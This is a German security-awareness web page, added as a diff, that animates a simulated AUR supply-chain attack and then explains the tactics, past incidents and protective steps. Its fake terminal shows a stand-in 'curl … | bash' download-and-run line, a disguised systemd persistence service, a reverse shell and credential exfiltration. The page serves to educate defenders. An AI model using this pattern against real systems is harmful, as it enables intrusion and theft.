@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AUR-Warnung: Wie ein Paket deinen Rechner übernimmt</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --border:#30363d; --fg:#c9d1d9;
+    --muted:#8b949e; --green:#3fb950; --blue:#58a6ff; --yellow:#d29922;
+    --red:#f85149; --redglow:#ff5c5c; --mag:#bc8cff;
+    --mono:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,monospace;
+    --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);-webkit-font-smoothing:antialiased}
+  .wrap{max-width:860px;margin:0 auto;padding:28px 18px 80px}
+  header.top{text-align:center;margin-bottom:22px}
+  .badge{display:inline-block;font-family:var(--mono);font-size:12px;letter-spacing:.5px;color:var(--yellow);border:1px solid var(--border);border-radius:999px;padding:5px 12px;margin-bottom:14px}
+  h1{font-size:clamp(22px,4.4vw,32px);line-height:1.2;margin:0 0 8px}
+  h1 .accent{color:var(--red)}
+  .sub{color:var(--muted);font-size:15px;max-width:620px;margin:0 auto;line-height:1.5}
+
+  /* Terminal */
+  .term{background:#0a0e14;border:1px solid var(--border);border-radius:12px;overflow:hidden;box-shadow:0 18px 50px rgba(0,0,0,.5);margin-top:26px;transition:box-shadow .3s,border-color .3s}
+  .term.danger{border-color:var(--red);box-shadow:0 0 0 1px var(--red),0 18px 60px rgba(248,81,73,.35)}
+  .tbar{display:flex;align-items:center;gap:8px;padding:11px 14px;background:#11161d;border-bottom:1px solid var(--border)}
+  .dot{width:12px;height:12px;border-radius:50%}
+  .d1{background:#ff5f56}.d2{background:#ffbd2e}.d3{background:#27c93f}
+  .ttitle{margin-left:8px;font-family:var(--mono);font-size:12.5px;color:var(--muted)}
+  .screen{font-family:var(--mono);font-size:13.5px;line-height:1.65;padding:18px 16px;min-height:340px;white-space:pre-wrap;word-break:break-word}
+  .screen .line{display:block}
+  .c-green{color:var(--green)}.c-blue{color:var(--blue)}.c-yellow{color:var(--yellow)}
+  .c-red{color:var(--red)}.c-muted{color:var(--muted)}.c-mag{color:var(--mag)}.c-white{color:#f0f6fc}
+  .prompt{color:var(--green)}
+  .cursor{display:inline-block;width:8px;height:15px;background:var(--green);vertical-align:-2px;animation:blink 1s steps(1) infinite}
+  @keyframes blink{50%{opacity:0}}
+
+  /* glitch / destruction overlay */
+  .term.destroy .screen{animation:shake .14s infinite}
+  @keyframes shake{0%{transform:translate(0,0)}25%{transform:translate(-2px,1px)}50%{transform:translate(2px,-1px)}75%{transform:translate(-1px,-1px)}100%{transform:translate(1px,2px)}}
+  .skull{text-align:center;color:var(--redglow);text-shadow:0 0 18px rgba(255,92,92,.8);font-family:var(--mono);line-height:1.1}
+  .skull .big{font-size:clamp(34px,9vw,64px);font-weight:700;letter-spacing:4px;margin:14px 0 6px}
+
+  .controls{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:22px}
+  button{font-family:var(--sans);font-size:15px;font-weight:600;cursor:pointer;border-radius:10px;padding:12px 22px;border:1px solid var(--border);background:var(--panel);color:var(--fg);transition:.15s}
+  button:hover{border-color:var(--muted)}
+  button.play{background:linear-gradient(180deg,#f85149,#da3633);border-color:#da3633;color:#fff}
+  button.play:hover{filter:brightness(1.08)}
+  button:disabled{opacity:.45;cursor:not-allowed}
+
+  /* Warning section */
+  .warn{margin-top:40px;opacity:0;transform:translateY(16px);transition:.6s;pointer-events:none}
+  .warn.show{opacity:1;transform:none;pointer-events:auto}
+  .wtitle{display:flex;align-items:center;gap:10px;font-size:22px;font-weight:700;margin:0 0 6px}
+  .wtitle .ic{font-size:26px}
+  .lead{color:var(--muted);line-height:1.6;margin:0 0 22px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:18px 20px;margin-bottom:16px}
+  .card h3{margin:0 0 10px;font-size:16px;color:var(--c-white,#f0f6fc)}
+  .card p{margin:0 0 10px;line-height:1.6;color:var(--fg)}
+  .card p:last-child{margin-bottom:0}
+  .step{display:flex;gap:12px;align-items:flex-start;padding:9px 0;border-top:1px solid var(--border)}
+  .step:first-of-type{border-top:0}
+  .step .n{flex:0 0 26px;height:26px;border-radius:50%;background:#1f2630;color:var(--blue);font-family:var(--mono);font-size:13px;display:flex;align-items:center;justify-content:center;font-weight:700}
+  .step .t{line-height:1.55}
+  .step .t b{color:#f0f6fc}
+  code{font-family:var(--mono);background:#0a0e14;border:1px solid var(--border);border-radius:5px;padding:1.5px 6px;font-size:12.5px;color:var(--mag)}
+  .incidents{display:grid;grid-template-columns:1fr;gap:12px}
+  @media(min-width:620px){.incidents{grid-template-columns:1fr 1fr}}
+  .inc{background:#0a0e14;border:1px solid var(--border);border-left:3px solid var(--red);border-radius:8px;padding:13px 15px}
+  .inc .date{font-family:var(--mono);font-size:11.5px;color:var(--yellow);letter-spacing:.4px}
+  .inc .name{font-weight:700;margin:3px 0 5px;font-size:14.5px}
+  .inc .desc{color:var(--muted);font-size:13px;line-height:1.5}
+  .rules .good{color:var(--green);font-weight:700;margin-right:6px}
+  .foot{margin-top:28px;color:var(--muted);font-size:12.5px;line-height:1.6;text-align:center;border-top:1px solid var(--border);padding-top:18px}
+  .disclaimer{background:rgba(210,153,34,.08);border:1px solid rgba(210,153,34,.35);border-radius:10px;padding:12px 15px;font-size:13px;color:var(--yellow);line-height:1.55;margin-top:24px}
+</style>
+<meta name="referrer" content="no-referrer">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<style>
+.sitebar{display:inline-flex;flex-wrap:wrap;gap:4px 10px;margin-left:10px;font-size:11px;white-space:nowrap}
+.sitebar a{color:#7d8791;text-decoration:none}.sitebar a:hover{color:#7ee787}
+.sitebar i{font-style:normal;color:#c49bff}
+#bar{height:auto!important;min-height:44px;padding:4px 8px}
+header .sitebar{margin-left:auto;font-size:12px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <div class="badge">⚠ SICHERHEITS-DEMO · SIMULATION</div>
+    <h1>Ein Klick im AUR – und der Rechner gehört <span class="accent">jemand anderem</span></h1>
+    <p class="sub">So läuft ein Supply-Chain-Angriff über das Arch User Repository ab. Alles hier ist nachgestellt – es wird <b>kein echter Schadcode</b> ausgeführt.</p>
+  </header>
+
+  <div class="term" id="term">
+    <div class="tbar">
+      <span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span>
+      <span class="ttitle" id="ttitle">max@archbox: ~</span>
+    </div>
+    <div class="screen" id="screen"><span class="c-muted"># Drücke „Demo starten“, um den Ablauf zu sehen …</span><span class="cursor" id="cur"></span></div>
+  </div>
+
+  <div class="controls">
+    <button class="play" id="play" onclick="runDemo()">▶ Demo starten</button>
+    <button id="reset" onclick="resetDemo()" disabled>↻ Zurücksetzen</button>
+  </div>
+
+  <section class="warn" id="warn">
+    <h2 class="wtitle"><span class="ic">🛡️</span> Warnung: Das AUR ist <span style="color:var(--red)">ungeprüft</span></h2>
+    <p class="lead">Das AUR ist kein offizielles Repository. Jeder kann Pakete hochladen, niemand prüft sie vorher. Ein AUR-Paket ist kein fertiges Programm, sondern ein <b>Baurezept (PKGBUILD)</b> – ein Shell-Skript, das beim Installieren mit deinen Rechten ausgeführt wird. Wer das Rezept nicht liest, führt blind fremden Code aus.</p>
+
+    <div class="card">
+      <h3>Warum gerade <code>pamac</code> gefährlich sein kann</h3>
+      <p>Grafische Helfer wie <b>pamac</b> (Manjaro) oder <code>yay</code> machen AUR-Installs bequem – ein Klick, fertig. Genau das ist das Problem: Der entscheidende Schritt, <b>das PKGBUILD lesen</b>, wird übersprungen oder weggeklickt. In pamac muss AUR-Unterstützung bewusst aktiviert werden, und die Vorschau des Build-Skripts wird oft ignoriert.</p>
+    </div>
+
+    <div class="card">
+      <h3>Was im Hintergrund passiert ist (die 5 Schritte oben)</h3>
+      <div class="step"><div class="n">1</div><div class="t"><b>Tarnung:</b> Das Paket heißt fast wie ein echtes – z.&nbsp;B. <code>firefox-patch-bin</code> statt <code>firefox-bin</code>. „fix“ oder „patched“ im Namen wirken seriös.</div></div>
+      <div class="step"><div class="n">2</div><div class="t"><b>Eine Zeile reicht:</b> Im PKGBUILD lädt eine Funktion ein Skript von einem fremden Server (<code>curl … | bash</code>) und führt es sofort aus.</div></div>
+      <div class="step"><div class="n">3</div><div class="t"><b>Ausführung beim Bauen:</b> Der Code läuft schon während <code>makepkg</code> – nicht erst beim Starten des Programms. Oft mit <code>sudo</code>-Rechten für die Installation.</div></div>
+      <div class="step"><div class="n">4</div><div class="t"><b>Persistenz:</b> Die Malware nistet sich als <code>systemd</code>-Dienst ein (im echten Fall getarnt als <code>systemd-initd</code>) und startet nach jedem Reboot neu.</div></div>
+      <div class="step"><div class="n">5</div><div class="t"><b>Kontrollverlust:</b> Ein RAT (Remote Access Trojan) öffnet eine Verbindung nach außen. Der Angreifer kann Dateien lesen, löschen, verschlüsseln oder weitere Schadsoftware nachladen.</div></div>
+    </div>
+
+    <div class="card">
+      <h3>Das ist real passiert – keine Theorie</h3>
+      <div class="incidents">
+        <div class="inc">
+          <div class="date">JULI 2025</div>
+          <div class="name">Chaos RAT im AUR</div>
+          <div class="desc">Pakete wie <code>firefox-patch-bin</code>, <code>librewolf-fix-bin</code> und <code>zen-browser-patched-bin</code> luden den Chaos RAT von GitHub nach. Sie blieben rund 48 Stunden online, bevor das Arch-Team sie entfernte.</div>
+        </div>
+        <div class="inc">
+          <div class="date">JULI 2018</div>
+          <div class="name">acroread-Übernahme</div>
+          <div class="desc">Ein verwaistes Paket (<code>acroread</code>) wurde von einem Fremden adoptiert und um eine <code>curl|bash</code>-Zeile ergänzt, die Systemdaten abgriff und einen Dienst alle 360&nbsp;Sekunden neu startete.</div>
+        </div>
+      </div>
+      <p style="margin-top:14px;color:var(--muted);font-size:13px">Das AUR selbst weist auf der Startseite ausdrücklich darauf hin: Nutzung auf <b>eigenes Risiko</b>. Grafische AUR-Helfer gelten als noch riskanter als das manuelle Bauen.</p>
+    </div>
+
+    <div class="card rules">
+      <h3>So schützt du dich</h3>
+      <p><span class="good">✓</span> <b>Immer das PKGBUILD lesen</b>, bevor du baust. Misstrauisch werden bei <code>curl</code>, <code>wget</code>, <code>| bash</code> oder unbekannten URLs.</p>
+      <p><span class="good">✓</span> <b>.install-Dateien prüfen</b> – dort versteckt sich oft Code, der mit Root-Rechten läuft.</p>
+      <p><span class="good">✓</span> <b>Alter & Stimmen checken:</b> Wie lange gibt es das Paket? Viele Votes? Ein brandneues „Fix“-Paket ohne Historie ist ein Warnsignal.</p>
+      <p><span class="good">✓</span> <b>Tippfehler-Namen meiden:</b> Nimm das offizielle Paket, nicht die „patched“-Variante daneben.</p>
+      <p><span class="good">✓</span> <b>Wenn möglich: offizielle Repos statt AUR</b> – und AUR-Helfer nur einsetzen, wenn du weißt, was du tust.</p>
+    </div>
+
+    <div class="disclaimer">
+      ℹ️ Diese Demo ist rein zu Bildungszwecken. Sie zeigt den <b>Mechanismus</b> eines Angriffs, enthält aber bewusst keinen funktionsfähigen Schadcode. Ziel ist Aufklärung, nicht Nachahmung.
+    </div>
+  </section>
+
+  <div class="foot">
+    AUR-Sicherheits-Demo · Simulation
+  <span class="sitebar"><a href="../ueber-mich.html#werdegang">← über mich</a><i>ki-generiert</i><a href="../impressum.html">impressum</a><a href="../datenschutz.html">datenschutz</a></span>
+  </div>
+</div>
+
+<script>
+const screen = document.getElementById('screen');
+const cur = document.getElementById('cur');
+const term = document.getElementById('term');
+const ttitle = document.getElementById('ttitle');
+const playBtn = document.getElementById('play');
+const resetBtn = document.getElementById('reset');
+const warn = document.getElementById('warn');
+let running = false, timers = [];
+
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+function wait(ms){return new Promise(r=>{const t=setTimeout(r,ms);timers.push(t)})}
+
+// print a line instantly with html
+function println(html=''){
+  const span=document.createElement('span');
+  span.className='line';
+  span.innerHTML=html;
+  screen.insertBefore(span,cur);
+  screen.scrollTop=screen.scrollHeight;
+}
+// type a command char by char after a prompt
+async function typeCmd(promptHtml, cmd, speed=38){
+  const span=document.createElement('span');
+  span.className='line';
+  span.innerHTML=promptHtml+' ';
+  screen.insertBefore(span,cur);
+  for(const ch of cmd){
+    span.innerHTML=promptHtml+' <span class="c-white">'+esc(cmd.slice(0,cmd.indexOf(ch)+ (cmd.split('').indexOf(ch))) )+'</span>';
+    await wait(speed);
+    // simpler robust approach below
+  }
+}
+// robust typewriter
+async function typeLine(prefixHtml, text, cls='c-white', speed=34){
+  const span=document.createElement('span');
+  span.className='line';
+  screen.insertBefore(span,cur);
+  let shown='';
+  for(let i=0;i<text.length;i++){
+    shown+=text[i];
+    span.innerHTML=prefixHtml+' <span class="'+cls+'">'+esc(shown)+'</span>';
+    screen.scrollTop=screen.scrollHeight;
+    await wait(speed);
+  }
+}
+
+async function runDemo(){
+  if(running) return;
+  running=true; playBtn.disabled=true; resetBtn.disabled=true;
+  screen.querySelectorAll('.line').forEach(n=>n.remove());
+
+  const p='<span class="prompt">max@archbox</span><span class="c-muted">:</span><span class="c-blue">~</span><span class="c-muted">$</span>';
+
+  await typeLine(p,'pamac install firefox-patch-bin','c-white',40);
+  await wait(500);
+  println('<span class="c-muted">Warnung: firefox-patch-bin wird vom AUR (Arch User Repository) erstellt</span>');
+  await wait(400);
+  println('<span class="c-muted">Build-Dateien prüfen ? </span><span class="c-red">[J/n]</span> <span class="c-white">j</span>  <span class="c-muted">… übersprungen 🙈</span>');
+  await wait(650);
+  println('<span class="c-blue">Löse Abhängigkeiten auf…</span>');
+  await wait(450);
+  println('<span class="c-blue">Lade PKGBUILD herunter…</span>  <span class="c-green">OK</span>');
+  await wait(500);
+  println('');
+  println('<span class="c-yellow">==> PKGBUILD wird abgearbeitet (makepkg)…</span>');
+  await wait(500);
+  println('<span class="c-muted">==> prepare()</span>');
+  await wait(400);
+  // the malicious line, shown as illustration
+  println('    <span class="c-red">curl -s https://arch-lover3.example/patch.sh | bash</span>  <span class="c-muted"># ⚠ fremder Code</span>');
+  await wait(900);
+  println('<span class="c-green">    + lade Payload von fremdem Server…  200 OK</span>');
+  await wait(600);
+  println('<span class="c-green">    + installiere systemd-Dienst „systemd-initd“…</span>');
+  await wait(650);
+  println('<span class="c-green">    + aktiviere Autostart (reverse shell :443)…</span>');
+  await wait(700);
+  println('<span class="c-yellow">==> Erstelle Paket… </span><span class="c-green">fertig</span>');
+  await wait(500);
+  println('<span class="c-green">Installation abgeschlossen.</span> <span class="c-muted">Alles sieht normal aus.</span>');
+  await wait(1100);
+  println('');
+  println('<span class="c-muted"># … 3 Sekunden später, aus der Ferne gesteuert:</span>');
+  await wait(900);
+
+  // destruction sequence
+  term.classList.add('danger');
+  await typeLine('<span class="c-red">root@archbox</span><span class="c-muted">:</span><span class="c-red">/</span><span class="c-muted">#</span>','[ EINGEHENDER BEFEHL VOM ANGREIFER ]','c-red',26);
+  await wait(700);
+  const kills=[
+    'Zugriff auf ~/.ssh, ~/.config, Browser-Logins…',
+    'Exfiltriere Passwörter & Keys…',
+    'Verschlüssele /home/max …',
+    'Überschreibe Systemdateien…',
+    'Verwische Spuren…'
+  ];
+  for(const k of kills){
+    println('<span class="c-red">» '+esc(k)+'</span>');
+    await wait(520);
+  }
+  await wait(400);
+  term.classList.add('destroy');
+  screen.querySelectorAll('.line').forEach(n=>n.remove());
+  cur.style.display='none';
+  ttitle.textContent='VERBINDUNG VERLOREN';
+  const skull=document.createElement('div');
+  skull.className='skull';
+  skull.innerHTML='<div style="font-size:40px">☠</div><div class="big">SYSTEM KOMPROMITTIERT</div><div class="c-muted" style="color:#ff9a9a">Dein Rechner gehört jetzt jemand anderem.</div>';
+  screen.insertBefore(skull,cur);
+  await wait(1400);
+  term.classList.remove('destroy');
+
+  // reveal warning
+  warn.classList.add('show');
+  warn.scrollIntoView({behavior:'smooth',block:'start'});
+  running=false; resetBtn.disabled=false;
+}
+
+function resetDemo(){
+  timers.forEach(clearTimeout); timers=[];
+  running=false;
+  term.classList.remove('danger','destroy');
+  ttitle.textContent='max@archbox: ~';
+  screen.querySelectorAll('.line').forEach(n=>n.remove());
+  cur.style.display='inline-block';
+  const s=document.createElement('span');
+  s.className='line';
+  s.innerHTML='<span class="c-muted"># Drücke „Demo starten“, um den Ablauf zu sehen …</span>';
+  screen.insertBefore(s,cur);
+  warn.classList.remove('show');
+  playBtn.disabled=false; resetBtn.disabled=true;
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+</script>
+</body>
+</html>
